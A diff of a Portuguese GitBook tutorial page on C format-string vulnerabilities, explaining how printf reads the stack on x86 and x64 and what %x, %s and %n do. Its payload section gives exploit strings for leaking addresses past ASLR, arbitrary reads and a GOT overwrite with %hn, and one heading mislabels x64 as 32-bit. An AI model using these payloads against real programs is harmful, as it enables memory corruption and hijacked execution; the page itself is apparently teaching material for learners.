@@ -57,7 +57,7 @@
     <link rel="shortcut icon" href="../gitbook/images/favicon.ico" type="image/x-icon">
 
     
-    <link rel="next" href="../fast_food/beginning.html" />
+    <link rel="next" href="4_array_indexing.html" />
     
     
     <link rel="prev" href="2_3_bof_shellcode.html" />
@@ -266,6 +266,45 @@
             
         </li>
     
+        <li class="chapter " data-level="1.3.1.5" data-path="4_array_indexing.html">
+            
+                <a href="4_array_indexing.html">
+            
+                    
+                    Array Indexing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.6" data-path="5_integer_overflow.html">
+            
+                <a href="5_integer_overflow.html">
+            
+                    
+                    Integer Overflow
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.3.1.7" data-path="6_bad_seed.html">
+            
+                <a href="6_bad_seed.html">
+            
+                    
+                    Bad seed
+            
+                </a>
+            
+
+            
+        </li>
+    
 
             </ul>
             
@@ -406,7 +445,7 @@
                 <a href="../fast_food/pwning/3_bof.html">
             
                     
-                    Buffer Overflow Simples
+                    Buffer Overflow - Variáveis
             
                 </a>
             
@@ -419,7 +458,7 @@
                 <a href="../fast_food/pwning/4_bof_callfunction.html">
             
                     
-                    Buffer Overflow - Variáveis
+                    Buffer Overflow - CallFunction
             
                 </a>
             
@@ -508,8 +547,8 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <h2 id="3-format-strings">3 Format Strings</h2>
-<p>Em C, a fun&#xE7;&#xE3;o printf recebe Format Specifiers e coloca vari&#xE1;veis nos lugares deles para imprimir ao usu&#xE1;rio.</p>
+                                <h2 id="format-strings">Format Strings</h2>
+<p>Em C, as fun&#xE7;&#xF5;es <code>printf</code>, <code>fprintf</code> ou qualquer outras parecidas recebem Format Specifiers e colocam vari&#xE1;veis nos lugares deles para imprimir ao usu&#xE1;rio.</p>
 <pre><code class="lang-C"><span class="hljs-keyword">int</span> value = <span class="hljs-number">1205</span>;
 
 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x %x %x&quot;</span>, value, value, value);
@@ -524,8 +563,8 @@
 <span class="hljs-comment">// Sa&#xED;da: 4b5 5659b000 565981b0</span>
 </code></pre>
 <p>O <code>printf</code> espera a mesma quantidade de par&#xE2;metros que Format Specifiers, e apenas puxa esses par&#xE2;metros da stack. Se n&#xE3;o h&#xE1; par&#xE2;metros suficientes na stack, <strong>a fun&#xE7;&#xE3;o vai pegar os pr&#xF3;ximos valores, vazando endere&#xE7;os da stack</strong>.</p>
-<h2 id="31-aplicando-format-strings">3.1 aplicando Format Strings</h2>
-<p>Temos o seguinte programa:</p>
+<h2 id="aplicando-format-strings">Aplicando Format Strings</h2>
+<p>Temos o seguinte programa em x86:</p>
 <pre><code class="lang-C"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
 
 <span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>{
@@ -549,29 +588,28 @@ Output: <code>f7f74080 0 5657b1c0 782573fc 20782520</code></p>
 06:0018&#x2502;-0d0 0xffffcf28 &#x25C2;&#x2014; &apos;%x %x %x %x %x&apos;
 07:001c&#x2502;-0cc 0xffffcf2c &#x25C2;&#x2014; &apos;x %x %x %x&apos;
 </code></pre><p>Veja que o que foi vazado foi o <strong>primeiro endere&#xE7;o a partir de esp em diante</strong>: <code>esp+0x4</code>, <code>esp+0x8</code>,...</p>
-<p>Regra do printf:</p>
-<ul>
-<li>printf espera par&#xE2;metros ap&#xF3;s o formato na pilha</li>
-<li>O primeiro par&#xE2;metro (string de formato) est&#xE1; no topo da pilha no momento da chamada</li>
-<li>Os par&#xE2;metros seguintes (que deveriam ser os valores para %x) estariam imediatamente ap&#xF3;s</li>
-</ul>
-<p>Para chamar <code>printf(buffer)</code>, o compilador precisa:</p>
+<p>Fluxo do printf:</p>
+<ol>
+<li>printf espera par&#xE2;metros ap&#xF3;s o formato na Stack</li>
+<li>O primeiro par&#xE2;metro (<strong>format string</strong>) est&#xE1; no <strong>topo da pilha</strong> no momento da chamada</li>
+<li>Os par&#xE2;metros seguintes (que deveriam ser os valores para %x) <strong>estariam imediatamente ap&#xF3;s</strong></li>
+</ol>
+<p>Para chamar <code>printf(buffer)</code>, o <strong>compilador</strong> precisa:</p>
 <ol>
 <li>Empurrar os par&#xE2;metros na pilha</li>
 <li>Chamar a fun&#xE7;&#xE3;o</li>
 </ol>
-<p>Para <code>printf(&quot;%d %d&quot;, a, b)</code>:</p>
+<p>Exemplo de preparo de chamada de <code>printf(&quot;%d %d&quot;, a, b)</code>:</p>
 <pre><code>; Supondo que buffer esteja em [ebp-30]
 push b  (34)        &#x2190; terceiro par&#xE2;metro
 push a  (99)        &#x2190; segundo par&#xE2;metro  
-lea eax, [ebp-30]    ; eax = endere&#xE7;o do buffer (que cont&#xE9;m &quot;%x %x %x %x %x&quot;)
+lea eax, [ebp-30]    ; eax recebe endere&#xE7;o do buffer (que cont&#xE9;m &quot;%x %x %x %x %x&quot;)
 push eax         &#x2190; primeiro par&#xE2;metro
-call printf          ; push endere&#xE7;o de retorno, jump para printf
-</code></pre><p>Ap&#xF3;s push eax, temos apenas:</p>
+call printf          ; push return address (stack), jump printf (rip)
+</code></pre><p>Ap&#xF3;s <code>push a, push b, push eax</code>, teremos a stack desse jeito:</p>
 <pre><code>(endere&#xE7;os altos)
 +------------------+
-| ...              |
-| end. retorno main|
+| ret. add printf  |
 +------------------+
 | ebp salvo        | &#x2190; EBP
 +------------------+
@@ -579,44 +617,144 @@ call printf          ; push endere&#xE7;o de retorno, jump para printf
 | ...              |  | buffer (vari&#xE1;vel local)
 | buffer[0]=&quot;%x&quot;   | /
 +------------------+ 
-| a                | &#x2190; ESP+12 (onde 2&#xBA; %d vai buscar)
+| b                | &#x2190; ESP+12 (onde 2&#xBA; %d vai buscar)
 +------------------+ 
-| b                | &#x2190; ESP+8 (onde 1&#xBA; %d vai buscar)
+| a                | &#x2190; ESP+8 (onde 1&#xBA; %d vai buscar)
 +------------------+
 | 1 Par&#xE2;metro      | &#x2190; ESP+4
 +------------------+
 | ponteiro p/ buffer| &#x2190; ESP APONTA AQUI! (primeiro par&#xE2;metro do printf)
 +------------------+
 (endere&#xE7;os baixos)
-</code></pre><p>Ap&#xF3;s dar push eax e call printf, teremos, de maneira geral:</p>
+</code></pre><p>Ap&#xF3;s dar <code>call printf</code>, agora estamos no Stack Frame da fun&#xE7;&#xE3;o <code>printf</code>:</p>
 <pre><code>(endere&#xE7;os altos)
-+------------------+ 
-| ...              | &#x2191;
-+------------------+ 
-| end. retorno main| 
-+------------------+ 
-| ebp salvo        | &#x2190; EBP da main (antes do printf)
-+------------------+ 
-| buffer[29]       | \
-| ...              |  | buffer &#x2190; regi&#xE3;o local da main
-| buffer[0]=&quot;%x&quot;   | /
-+------------------+
-| ???              | &#x2190; EBP+20 (onde 3&#xBA; %x vai buscar)
-+------------------+
-| ???              | &#x2190; EBP+16 (onde 2&#xBA; %x vai buscar)
-+------------------+
-| ???              | &#x2190; EBP+12 (onde 1&#xBA; %x vai buscar)
-+------------------+ 
-| ponteiro p/ buffer| &#x2190; EBP+8 do printf (1&#xBA; par&#xE2;metro)
-+------------------+ 
-| end. retorno      | &#x2190; EBP+4 do printf (salvo pelo call)
-+------------------+ 
++-------------------+ 
+| ...               | &#x2191;
++-------------------+ 
+| end. retorno main | 
++-------------------+ 
+| ebp salvo         | &#x2190; EBP da main (antes do printf)
++-------------------+ 
+| buffer[29]        | \
+| ...               |  | Format String &#x2190; regi&#xE3;o local da main (antes do printf)
+| buffer[0]=&quot;%x&quot;    | /
++-------------------+
+| ???               | &#x2190; EBP+16 (onde 2&#xBA; %d vai buscar)
++-------------------+
+| ???               | &#x2190; EBP+12 (onde 1&#xBA; %d vai buscar)
++-------------------+ 
+| ponteiro p/ buffer| &#x2190; EBP+8 do printf (Format String, 1&#xBA; Par&#xE2;metro do printf)
++-------------------+ 
+| ret. add printf   | &#x2190; EBP+4 do printf
++-------------------+ 
 | ebp salvo (printf)| &#x2190; EBP do printf
-+------------------+ 
++-------------------+ 
 | vars locais printf| 
-+------------------+ &#x2190; ESP dentro do printf
++-------------------+ &#x2190; ESP dentro do printf
 (endere&#xE7;os baixos)
-</code></pre><p>A vulnerabilidade de format string vaza TODA a regi&#xE3;o da pilha, n&#xE3;o importa se a vari&#xE1;vel tem &quot;rela&#xE7;&#xE3;o&quot; com o printf ou n&#xE3;o. &#xC9; muito poderoso e simples.</p>
+</code></pre><p>A vulnerabilidade de format string <strong>pode vazar TODA a regi&#xE3;o da pilha</strong>, n&#xE3;o importa se a vari&#xE1;vel tem &quot;rela&#xE7;&#xE3;o&quot; com o printf ou n&#xE3;o. Isso pois ela permite ver desde o ESP at&#xE9; o EBP da <code>main</code> (fun&#xE7;&#xE3;o que chamou <code>printf</code>).</p>
+<p>Se pensarmos como blocos, um <code>printf(&quot;%x&quot;)</code> imprime o conte&#xFA;do do primeiro bloco depois de <strong>ESP</strong>.</p>
+<h2 id="diferen&#xE7;a-entre-32-bit-e-64-bit">Diferen&#xE7;a entre 32-bit e 64-bit</h2>
+<h3 id="x86-32-bit">x86 (32-bit)</h3>
+<ul>
+<li>Argumentos s&#xE3;o passados na <strong>stack</strong></li>
+<li>printf vai buscar o valor para <code>%x</code> do pr&#xF3;ximo endere&#xE7;o na stack</li>
+<li>Isso seria aproximadamente ESP+4 (considerando o endere&#xE7;o de retorno na stack)</li>
+</ul>
+<p>Antes de chamar printf:</p>
+<pre><code>ESP   &#x2192; endere&#xE7;o de retorno
+ESP+4 &#x2192; possivelmente o primeiro argumento (se houvesse)
+ESP+8 &#x2192; segundo argumento, etc.
+</code></pre><p>Quando printf(&quot;%x&quot;) &#xE9; chamado:</p>
+<ul>
+<li>printf espera encontrar o valor para %x em ESP+4</li>
+<li>Mas ESP+4 cont&#xE9;m o endere&#xE7;o de retorno ou lixo</li>
+</ul>
+<h3 id="x64-32-bit">x64 (32-bit)</h3>
+<ul>
+<li>Os primeiros argumentos s&#xE3;o passados em registradores</li>
+<li><code>printf</code> vai primeiro olhar nos registradores que armazenam par&#xE2;metros (<code>RDI</code>, <code>RSI</code>, <code>RDX</code>, <code>RCX</code>, <code>R8</code>, <code>R9</code>)</li>
+<li>S&#xF3; depois busca na stack</li>
+</ul>
+<p>Lembrando a ordem de passagem de argumentos para registradores:</p>
+<ol>
+<li><code>RDI</code> (Endere&#xE7;o da Format String)</li>
+<li><code>RSI</code>  (Par&#xE2;metro 1)</li>
+<li><code>RDX</code> (Par&#xE2;metro 2)</li>
+<li><code>RCX</code> (...)</li>
+<li><code>R8</code></li>
+<li><code>R9</code></li>
+<li>Stack (RSP+8, RSP+16, ...)</li>
+</ol>
+<p>Se usarmos <code>printf(&quot;%x&quot;)</code>, veremos o que h&#xE1; de conte&#xFA;do no registrador <code>RSI</code>, que pode ser lixo de mem&#xF3;ria ou valor usado anteriormente pela fun&#xE7;&#xE3;o que fez a <code>call</code>.</p>
+<p>Isso nem sempre &#xE9; muito &#xFA;til. Mas se usarmos <code>printf(&quot;%x %x %x %x %x %x %x&quot;)</code>, temos:</p>
+<pre><code>%x 1 &#x2192; RSI (2&#xBA; registrador)
+%x 2 &#x2192; RDX (3&#xBA; registrador)  
+%x 3 &#x2192; RCX (4&#xBA; registrador)
+%x 4 &#x2192; R8  (5&#xBA; registrador)
+%x 5 &#x2192; R9  (6&#xBA; registrador)
+%x 6 &#x2192; Stack (RSP+8)  &#x2190; AQUI COME&#xC7;A A STACK!
+%x 7 &#x2192; Stack (RSP+16)
+</code></pre><h2 id="tipos-de-format-strings">Tipos de Format Strings</h2>
+<ul>
+<li><code>%x</code> - Imprime conte&#xFA;do do bloco de mem&#xF3;ria em hexadecimal. <code>%p</code> faz a mesma coisa, mas coloca <code>0x</code> na frente.<pre><code class="lang-c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%x&quot;</span>);        <span class="hljs-comment">// Vaza 4 bytes da stack</span>
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%08x&quot;</span>);      <span class="hljs-comment">// Vaza com padding (8 d&#xED;gitos)</span>
+</code></pre>
+</li>
+<li><code>%s</code> - Imprime string at&#xE9; null byte. Ao receber um bloco da stack como par&#xE2;metro, tenta interpretar o conte&#xFA;do do bloco como ponteiro, indo at&#xE9; esse endere&#xE7;o e imprimindo o conte&#xFA;do como string.<ul>
+<li>Se argumento for endere&#xE7;o v&#xE1;lido - L&#xEA; at&#xE9; null byte</li>
+<li>Se for endere&#xE7;o inv&#xE1;lido - Segmentation fault</li>
+<li>Se controlarmos o argumento, podemos ler a string de qualquer endere&#xE7;o (BOF - Vari&#xE1;vel)<pre><code class="lang-c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>, <span class="hljs-number">0x404000</span>);  <span class="hljs-comment">// L&#xEA; string do endere&#xE7;o 0x404000</span>
+<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s&quot;</span>);            <span class="hljs-comment">// Tenta ler endere&#xE7;o da stack como ponteiro</span>
+</code></pre>
+</li>
+</ul>
+</li>
+<li><code>%n</code> - Escreve o n&#xFA;mero de bytes impressos at&#xE9; agora no endere&#xE7;o dado. N&#xE3;o imprime texto, mas escreve em um endere&#xE7;o de mem&#xF3;ria.<ul>
+<li><code>%n</code>- Escreve int (4 bytes)</li>
+<li><code>%hn</code> - Escreve short (2 bytes)</li>
+<li><code>%hhn</code> - Escreve char (1 byte)<pre><code class="lang-C"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%100x%n&quot;</span>, <span class="hljs-number">0</span>, &amp;var);  <span class="hljs-comment">// Escreve 100 em &amp;var </span>
+<span class="hljs-comment">// (voc&#xEA; pode usar isso para escrever o valor que quiser no bloco de mem&#xF3;ria)</span>
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="exemplo-de-payload">Exemplo de payload</h2>
+<p>Exemplo 1:</p>
+<pre><code># 1. Reconhecimento: Onde est&#xE1; nosso input? (encontrar os AAAA = 0x41414141)
+AAAA.%x.%x.%x.%x.%x.%x
+
+# 2. Leak de endere&#xE7;os (bypass ASLR)
+%p.%p.%p.%p.%p.%p.%p
+
+# 3. Arbitrary Read: ler de 0x404000
+# (primeiro colocar 0x404000 no buffer)
+\x00\x40\x40\x00.%s
+
+# 4. Arbitrary Write: sobrescrever GOT entry
+# Escrever 0xdeadbeef em 0x404020
+# Usando %hn para write parcial
+
+\x20\x40\x40\x00\x00\x00\x00\x00   # addr_low (0x404020)
+\x22\x40\x40\x00\x00\x00\x00\x00   # addr_high (0x404022)
+%.48863x                           # Padding para 0xbeef
+%7$hn                              # Write para addr_low
+%.8126x                            # Padding para 0xdead  
+%8$hn                              # Write para addr_high
+</code></pre><ul>
+<li>Descobrimos que nosso input/buffer &#xE9; armazenado no 7&#xBA; argumento que o <code>printf</code> d&#xE1;</li>
+<li><code>%7$hn</code>: Acessa o 7&#xBA; &quot;argumento&quot; (primeiro endere&#xE7;o: <code>0x404020</code>)<ul>
+<li>Escreve o n&#xFA;mero de bytes impressos at&#xE9; agora (48879 = <code>0xbeef</code>)</li>
+<li>No endere&#xE7;o <code>0x404020</code></li>
+</ul>
+</li>
+<li><code>%8$hn</code>: Acessa o 8&#xBA; &quot;argumento&quot; (segundo endere&#xE7;o: 0x404022)<ul>
+<li>Escreve o total de bytes impressos (57005 = <code>0xdead</code>)</li>
+<li>No endere&#xE7;o <code>0x404022</code></li>
+</ul>
+</li>
+</ul>
 
                                 
                                 </section>
@@ -649,7 +787,7 @@ call printf          ; push endere&#xE7;o de retorno, jump para printf
                 </a>
                 
                 
-                <a href="../fast_food/beginning.html" class="navigation navigation-next " aria-label="Next page: Fast Food">
+                <a href="4_array_indexing.html" class="navigation navigation-next " aria-label="Next page: Array Indexing">
                     <i class="fa fa-angle-right"></i>
                 </a>
                 
@@ -660,7 +798,7 @@ call printf          ; push endere&#xE7;o de retorno, jump para printf
     <script>
         var gitbook = gitbook || [];
         gitbook.push(function() {
-            gitbook.page.hasChanged({"page":{"title":"Format Strings","level":"1.3.1.4","depth":3,"next":{"title":"Fast Food","level":"1.4","depth":1,"path":"fast_food/beginning.md","ref":"./fast_food/beginning.md","articles":[{"title":"Fast Intro","level":"1.4.1","depth":2,"path":"fast_food/introduction/1_beggining.md","ref":"./fast_food/introduction/1_beggining.md","articles":[{"title":"Assembly CheatSheet","level":"1.4.1.1","depth":3,"path":"fast_food/introduction/2_assembly.md","ref":"./fast_food/introduction/2_assembly.md","articles":[]},{"title":"Endianness","level":"1.4.1.2","depth":3,"path":"fast_food/introduction/3_endianness.md","ref":"./fast_food/introduction/3_endianness.md","articles":[]},{"title":"Ghidra","level":"1.4.1.3","depth":3,"path":"fast_food/introduction/4_ghidra.md","ref":"./fast_food/introduction/4_ghidra.md","articles":[]},{"title":"GDB CheatSheet","level":"1.4.1.4","depth":3,"path":"fast_food/introduction/5_gdb.md","ref":"./fast_food/introduction/5_gdb.md","articles":[]},{"title":"Pwntools CheatSheet","level":"1.4.1.5","depth":3,"path":"fast_food/introduction/6_pwntools.md","ref":"./fast_food/introduction/6_pwntools.md","articles":[]}]},{"title":"Fast Pwning","level":"1.4.2","depth":2,"path":"pwning/1_beginning.md","ref":"./pwning/1_beginning.md","articles":[{"title":"Proteções de binários","level":"1.4.2.1","depth":3,"path":"fast_food/pwning/2_protections.md","ref":"./fast_food/pwning/2_protections.md","articles":[]},{"title":"Buffer Overflow Simples","level":"1.4.2.2","depth":3,"path":"fast_food/pwning/3_bof.md","ref":"./fast_food/pwning/3_bof.md","articles":[]},{"title":"Buffer Overflow - Variáveis","level":"1.4.2.3","depth":3,"path":"fast_food/pwning/4_bof_callfunction.md","ref":"./fast_food/pwning/4_bof_callfunction.md","articles":[]},{"title":"Buffer Overflow - ShellCode","level":"1.4.2.4","depth":3,"path":"fast_food/pwning/5_bof_shellcode.md","ref":"./fast_food/pwning/5_bof_shellcode.md","articles":[]},{"title":"Format Strings","level":"1.4.2.5","depth":3,"path":"fast_food/pwning/6_format_strings.md","ref":"./fast_food/pwning/6_format_strings.md","articles":[]}]}]},"previous":{"title":"Buffer Overflow - ShellCode","level":"1.3.1.3","depth":3,"path":"pwning/2_3_bof_shellcode.md","ref":"./pwning/2_3_bof_shellcode.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css","website":"styles/website.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css","website":"styles/website.css"}},"file":{"path":"pwning/3_format_strings.md","mtime":"2025-12-18T20:49:41.596Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2025-12-19T13:17:28.477Z"},"basePath":"..","book":{"language":""}});
+            gitbook.page.hasChanged({"page":{"title":"Format Strings","level":"1.3.1.4","depth":3,"next":{"title":"Array Indexing","level":"1.3.1.5","depth":3,"path":"pwning/4_array_indexing.md","ref":"./pwning/4_array_indexing.md","articles":[]},"previous":{"title":"Buffer Overflow - ShellCode","level":"1.3.1.3","depth":3,"path":"pwning/2_3_bof_shellcode.md","ref":"./pwning/2_3_bof_shellcode.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"*","theme":"default","variables":{},"plugins":[],"pluginsConfig":{"highlight":{},"search":{},"lunr":{"maxIndexSize":1000000,"ignoreSpecialCharacters":false},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"fontsettings":{"theme":"white","family":"sans","size":2},"theme-default":{"styles":{"pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css","website":"styles/website.css"},"showLevel":false}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css","website":"styles/website.css"}},"file":{"path":"pwning/3_format_strings.md","mtime":"2025-12-19T14:32:05.271Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2025-12-21T02:45:52.953Z"},"basePath":"..","book":{"language":""}});
         });
     </script>
 </div>
